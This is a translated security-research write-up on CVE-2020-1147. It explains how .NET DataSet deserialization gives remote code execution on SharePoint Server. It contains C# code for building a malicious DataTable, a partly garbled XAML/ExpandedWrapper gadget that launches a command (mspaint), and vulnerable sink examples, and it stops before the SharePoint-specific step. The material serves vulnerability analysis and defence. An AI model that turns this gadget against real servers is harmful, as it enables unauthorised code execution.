# SharePoint and Pwn :: Remote Code Execution Against SharePoint Server
Abusing DataSet
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：360核心安全团队
## 0x01 Summary
When [CVE-2020-1147](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147) was released last week I was curious as to
how this vulnerability manifested and how an attacker might achieve remote
code execution with it. Since I’m somewhat familar with SharePoint Server and
.net, I decided to take a look.
TL;DR
I share the breakdown of CVE-2020-1147 which was discovered independently by
[Oleksandr Mirosh](https://twitter.com/olekmirosh), [Markus
Wulftange](https://twitter.com/mwulftange) and [Jonathan
Birch](https://www.linkedin.com/in/jonathan-birch-ab27681/). I share the
details on how it can be leveraged against a SharePoint Server instance to
gain remote code execution as a low privileged user. Please note: I am not
providing a full exploit, so if that’s your jam, move along.
One of the things that stood out to me, was that Microsoft published [Security
Guidence](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance)
related to this bug, quoting Microsoft:
> If the incoming XML data contains an object whose type is not in this list…
> An exception is thrown. The deserialization operation fails. When loading
> XML into an existing DataSet or DataTable instance, the existing column
> definitions are also taken into account. If the table already contains a
> column definition of a custom type, that type is temporarily added to the
> allow list for the duration of the XML deserialization operation.
Interestingly, it was possible to specify types and it was possible to
overwrite column definitions. That was the key giveaway for me, let’s take a
look at how the `DataSet` object is created:
## 0x02 Analyze
### Understanding the DataSet Object
A [`DataSet`](https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset?view=netcore-3.1) contains a `Datatable`
with `DataColumn`(s) and `DataRow`(s). More importantly, it implements the
ISerializable interface meaning that it can be serialized with
`XmlSerializer`. Let’s start by creating a `DataTable`:
    static void Main(string[] args)
    {
        // instantiate the table
        DataTable exptable = new DataTable("exp table");
        // make a column and set type information and append to the table
        DataColumn dc = new DataColumn("ObjectDataProviderCol");
        dc.DataType = typeof(ObjectDataProvider);
        exptable.Columns.Add(dc);
        // make a row and set an object instance and append to the table
        DataRow row = exptable.NewRow();
        row["ObjectDataProviderCol"] = new ObjectDataProvider();
        exptable.Rows.Add(row);
        // dump the xml schema
        exptable.WriteXmlSchema("c:/poc-schema.xml");
    }
Using the `WriteXmlSchema` method, It’s possible to write out the schema
definition. That code produces the following:
    " xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
Looking into the code of `DataSet` it’s revealed that it exposes its own
serialization methods (wrapped over `XmlSerializer`) using `WriteXml` and
`ReadXML`:
    System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
      System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
        System.Data.XmlDataLoader.LoadData(XmlReader reader)
          System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
            System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
              System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
                System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
    System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
Now, all that’s left to do is add the table to a dataset and serialize it up:
    DataSet ds = new DataSet("poc");
    ds.Tables.Add(exptable);
    using (var writer = new StringWriter())
    {
        ds.WriteXml(writer);
        Console.WriteLine(writer.ToString());
    }
These serialization methods retain schema types and reconstruct attacker
influenced types at runtime using a single `DataSet` expected type in the
instantiated `XmlSerializer` object graph.
### The DataSet Gadget
Below is an example of such a gadget that can be crafted, note that this is
not to be confused with the DataSet gadgets in `ysoserial`:
      " xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="somedataset">
            " xmlns:xsd="">
                Parse
                  " xmlns:xsd="" xsi:type="xsd:string">" xmlns:x="" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">cmd/c mspaint ]]>
This gadget chain will call an arbitrary static method on a `Type` which
contains no interface members. Here I used the notorious `XamlReader.Parse` to
load malicious Xaml to execute a system command. I used the `ExpandedWrapper`
class to load two different types as mentioned by
[@pwntester](https://twitter.com/pwntester)’s [amazing
research](https://speakerdeck.com/pwntester/attacking-net-serialization).
It can be leveraged in a number of sinks, such as:
    XmlSerializer ser = new XmlSerializer(typeof(DataSet));
    Stream reader = new FileStream("c:/poc.xml", FileMode.Open);
    ser.Deserialize(reader);
Many applications consider `DataSet` to be safe, so even if the expected type
can’t be controlled directly to `XmlSerializer`, `DataSet` is typically used
in the object graph. However, the most interesting sink is the
`DataSet.ReadXml` to trigger code execution:
    DataSet ds = new DataSet();
    ds.ReadXml("c:/poc.xml");
### Applying the Gadget to SharePoint Server
If we take a look at
[ZDI-20-874](https://www.zerodayinitiative.com/advisories/ZDI-20-874/), the
advisory mentions the
`Microsoft.PerformancePoint.Scorecards.Client.ExcelDataSet` control which can
be leveraged for remote code execution. This immediately plagued my interest
since it had the name (DataSet) in its class name. Let’s take a look at
SharePoint’s default web.config file: